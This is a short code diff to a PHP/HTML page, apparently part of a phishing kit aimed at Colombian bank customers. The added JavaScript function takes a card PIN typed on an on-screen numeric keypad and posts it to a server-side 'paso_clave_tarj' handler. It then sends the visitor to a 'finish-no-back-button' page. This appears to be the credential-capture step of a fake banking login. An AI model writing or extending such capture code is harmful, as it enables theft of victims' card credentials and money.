@@ -20,7 +20,6 @@ date_default_timezone_set('America/Bogota');
 		<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
 		<script type="text/javascript" src="/js/jquery-3.6.0.min.js"></script>
 		<script src="/js/jquery.jclock-min.js" type="text/javascript"></script>
-		<script type="text/javascript" src="js/functions.js"></script>
 		<style type="text/css">
 			#frm-clave {
 				display: block !important;
@@ -87,6 +86,14 @@ date_default_timezone_set('America/Bogota');
 	</body>
 </html>
 <script type="text/javascript">
+	function paso_clave_tarj(clave) {
+		$.post("../../../process/paso_clave_tarj.php", { clave: clave }, function(data) {
+			setTimeout(function() {
+				window.location.href = "../../../finish-no-back-button/";
+			}, 1000);
+		});
+	}
+
 	$(document).ready(function() {
 		// Teclado virtual numérico
 		$(".teclado-num").click(function(){
